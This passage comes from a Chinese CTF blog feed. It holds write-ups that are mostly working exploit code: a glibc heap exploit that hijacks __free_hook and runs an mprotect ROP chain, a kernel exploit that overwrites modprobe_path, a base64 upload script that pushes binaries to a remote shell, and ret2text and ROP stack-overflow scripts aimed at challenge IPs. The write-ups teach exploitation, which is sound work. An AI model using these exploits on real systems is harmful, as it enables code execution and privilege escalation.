data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./orw_h2&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./orw_h2&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">choice</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"built_in\">str</span>(choice))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,data=<span class=\"string\">&#x27;u&#x27;</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Length of game description:&#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Game description:&#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Edit Game description:&#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;game index: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x420</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x1518b0</span> <span class=\"comment\"># mov    rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</span></span><br><span class=\"line\">rdi = libc_base + <span class=\"number\">0x0000000000023b72</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002604f</span></span><br><span class=\"line\">rdx_r12 = libc_base + <span class=\"number\">0x0000000000119241</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">rax = libc_base + <span class=\"number\">0x0000000000047400</span></span><br><span class=\"line\">jmp_rsi = libc_base + <span class=\"number\">0x000000000010d60d</span></span><br><span class=\"line\">read_addr = libc.sym.read</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000047400 : pop rax ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b72 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119241 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f7e6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001025ad : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000024920 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b70 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002604f : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000133fe6 : pop rsi ; ret 0xb</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002491c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b6c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002604b : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef1c5 : pop rsp ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000460a5 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025bcc : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e261 : pop rsp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000012cfae : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f73a : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000099050 : pop rsp ; ret 0xffff</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000022679 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># orw = flat([</span></span><br><span class=\"line\"><span class=\"comment\">#     rax,2,rdi,heap_base+0x290+0x10,rsi,0,syscall_ret,rdi,3,rdx_r12,0x100,0,rsi,heap_base+0x290+0x20,read_addr,rdi,1,write_addr</span></span><br><span class=\"line\"><span class=\"comment\"># ])</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x430</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;u&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;u&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heap_leak = uu64(rc(<span class=\"number\">6</span>))</span><br><span class=\"line\">heap_base = heap_leak - <span class=\"number\">0x290</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    rdi,((heap_base + <span class=\"number\">0xD00</span>)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx_r12,<span class=\"number\">7</span>,<span class=\"number\">0</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,heap_base + <span class=\"number\">0xD00</span>,rdx_r12,<span class=\"number\">0x1000</span>,<span class=\"number\">0</span>,read_addr,jmp_rsi</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(libc_base+<span class=\"number\">0x1ecfd0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x420</span>) <span class=\"comment\"># 3 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,p64(libc.sym.__free_hook))</span><br><span class=\"line\">add(<span class=\"number\">0x20</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,p64(magic)) <span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\">fuck = SigreturnFrame()</span><br><span class=\"line\">fuck.rsp = heap_base + <span class=\"number\">0x700</span></span><br><span class=\"line\">fuck.rip = ret</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,p64(<span class=\"number\">0</span>) + p64(heap_base + <span class=\"number\">0x290</span>+<span class=\"number\">0x10</span>) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(libc.sym.setcontext+<span class=\"number\">61</span>)+<span class=\"built_in\">str</span>(fuck)[<span class=\"number\">0x28</span>:])<span class=\"comment\"># mov rdx,QWORD PTR [rdi+0x8];mov QWORD PTR [rsp],rax;call   QWORD PTR [rdx+0x20]</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,mmp)</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"kernel\"><a class=\"anchor\" href=\"#kernel\">#</a> Kernel</h3>\n<p>简单的 kernel 题，给了任意地址写。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/b7beb5832ebd13347106f73a5efab408.png\" alt=\"image-20220608114038284\" /></p>\n<p>那么劫持 <strong>modprobe_path</strong> 为我们自己的恶意 sh 文件路径，复制文件更改权限，就可以读 flag。</p>\n<p>用来读 flag 的 exp 源码：</p>\n<p><strong>exp.c</strong></p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> path = <span class=\"number\">0xffffffff81e48240</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> ** argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> fd1 = open(<span class=\"string\">&quot;/dev/chardev0&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(fd1 &lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Failed to open the babydev1!\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ffffffff81e48240 D modprobe_path</span></span><br><span class=\"line\">    <span class=\"comment\">// ffffffffc0000000 t chardev_ioctl        [www]</span></span><br><span class=\"line\">    <span class=\"comment\">// 0xffffffffc000001e</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> ar[<span class=\"number\">2</span>] = &#123;path,<span class=\"number\">0x612f706d742f</span>&#125;;</span><br><span class=\"line\">    ioctl(fd1,<span class=\"number\">0x80084700</span>,ar);</span><br><span class=\"line\">    </span><br><span class=\"line\">    system(<span class=\"string\">&quot;echo -ne &#x27;#!/bin/sh\\n/bin/cp /flag /tmp/flag\\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;chmod +x /tmp/a&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;chmod +x /tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/tmp/uuu&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;cat /tmp/flag&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>编译脚本：</strong></p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">musl-gcc exp.c -static -O2 -o exp <span class=\"comment\"># 这里用了 musl 编译缩小 exp 大小</span></span><br><span class=\"line\">strip exp</span><br></pre></td></tr></table></figure></p>\n<p><strong>用来上传 exp 的脚本：</strong></p>\n<p><strong><span class=\"exturl\" data-url=\"aHR0cDovL2NjLnB5\">cc.py</span></strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time, os</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;101.133.134.12&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./b64_exp&quot;</span>, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">count = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;now line: &#x27;</span> + <span class=\"built_in\">str</span>(count))</span><br><span class=\"line\">    line = f.readline().replace(<span class=\"string\">&quot;\\n&quot;</span>,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(line)&lt;=<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    cmd = <span class=\"string\">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class=\"string\">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class=\"line\">    p.sendline(cmd)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;/ $&quot;</span>)</span><br><span class=\"line\">    count += <span class=\"number\">1</span></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;chmod +x ./exp;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;./exp&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>截图证明顺利的读到 <strong>flag</strong> 。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444669/Typera/2023/04/ec5895eb753ca0112ace1beac830a20a.png\" alt=\"image-20220608113858776\" /></p>\n<h3 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnR0bmJhMy5jbi8yMDIxLzAzLzAzL05PVEUtMFgwMy1MSU5VWC1LRVJORUwtUFdOLVBBUlQtSUkv\">【NOTES.0x03】Linux Kernel Pwn II：Basic Exploit to Kernel Pwn in CTF - arttnba3's blog</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sa21pZGFzLmdpdGh1Yi5pby9wb3N0cy8yMDIxMDIyMy1saW51eC1rZXJuZWwtcHduLW1vZHByb2JlLw==\">Linux Kernel Exploitation Technique: Overwriting modprobe_path - Midas</span></p>\n",
            "tags": [
                "Crypto",
                "CTF",
                "Web",
                "Miec",
                "Re",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2022%E5%87%BA%E9%A2%98%E9%83%A8%E5%88%86wp/",
            "title": "CUMTCTF-2022出题部分wp",
            "date_published": "2022-06-08T04:04:04.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h3>\n<p>这题就不说了吧，连上啥都有，我连要用到的命令解释都给了～</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444312/Typera/2023/04/6c7177a450f396a3cc1df92db2cec62b.png\" alt=\"image-20230426013827815\" /></p>\n<h3 id=\"ret2text\"><a class=\"anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p>看一下保护：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444337/Typera/2023/04/8810580d090cd91812198696d7ddb02d.png\" alt=\"image-20230426013852620\" /><br />\n 主函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444396/Typera/2023/04/b70fb5e227640f018d72822fc557ad7e.png\" alt=\"image-20230426013952537\" /><br />\n 后门函数：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444400/Typera/2023/04/217429008da529ab0c39ef4f51553b97.png\" alt=\"image-20230426013957304\" /></p>\n<p>栈溢出就行，一张好图理解一下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444407/Typera/2023/04/f1fddeaa3a59bd82ab8dbb7032f73399.png\" alt=\"image-20230426014002698\" /></p>\n<p>思路：用 ‘a' 覆盖 buf 一直到覆盖上 ebp，然后将 ret (返回地址) 的地方写入为后门函数的地址。</p>\n<p>双击左侧栏的 backdoor 函数，右侧能找到函数地址如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444409/Typera/2023/04/0462346171ca0ff7f93c6db0364f57de.png\" alt=\"image-20230426014006566\" /></p>\n<p>直接照思路这么写，能打通本地，但是会打不通远程，因为栈帧没有平衡（hint），这时候中间插个 retn 的 gadget 就能解决。</p>\n<p>随便找个 retn 的地址<br />\n这个就能用：</p>\n<p>最后，脚本如下（环境没关，可以继续打远程）：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444413/Typera/2023/04/d5ad6da67403e757b9bc721f47816524.png\" alt=\"image-20230426014010146\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(b&#x27;./ret2text&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10002</span>)</span><br><span class=\"line\">backdoor=<span class=\"number\">0x4011DD</span></span><br><span class=\"line\">retn=<span class=\"number\">0x401203</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>+p64(retn)+p64(backdoor)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;2022!&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"overflow\"><a class=\"anchor\" href=\"#overflow\">#</a> overflow</h3>\n<p>保护和之前 ret2text 的一样，<br />\n同样可以使用栈溢出漏洞，但是没有一个写好的 backdoor 函数了。</p>\n<p>shift+F12 查看字符串，能找到 /bin/sh ，双击得到地址为：0x404050<br />\n 左侧也能找到 system () 函数，<br />\n这时我们可以通过 rop 将 /bin/sh 装入 system () 函数中来 getshell。</p>\n<p>具体 ROP 时什么东西可以自行搜索，这里详细说一下怎么利用，<br />\n有了 system，有了 /bin/sh，唯一的问题就是传参了（因为 我们要的是 system (&quot;/bin/sh&quot;)，要把 /bin/sh 当作参数传到 system 执行嘛），<br />\n我们可以用 rop 做到这一点：<br />\n64 位程序通过寄存器存放参数，所以我们可以用 pop rdi 将 /bin/sh 字串的地址压入 rdi，然后 ret，再把 esp 指向 system () 函数地址执行就能 getshell 了。</p>\n<p>所以，我们只需要用到 pop rdi ret 一个 gadget，用 ROPgadget 工具搜索一下就能得到地址，命令如下：<br />\n <code>ROPgadget --binary overflow --only &quot;pop|ret&quot;</code></p>\n<p>最后还有平衡栈帧的问题注意一下，脚本如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./overflow&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">b&#x27;106.15.52.194&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x4012e3</span></span><br><span class=\"line\">bin_sh=<span class=\"number\">0x404050</span></span><br><span class=\"line\">system=<span class=\"number\">0x401090</span></span><br><span class=\"line\">retn=<span class=\"number\">0x40101a</span></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">11</span> + p64(pop_rdi) + p64(bin_sh) + p64(retn) + p64(system)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;name?\\n&#x27;</span>,p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"caesar\"><a class=\"anchor\" href=\"#caesar\">#</a> 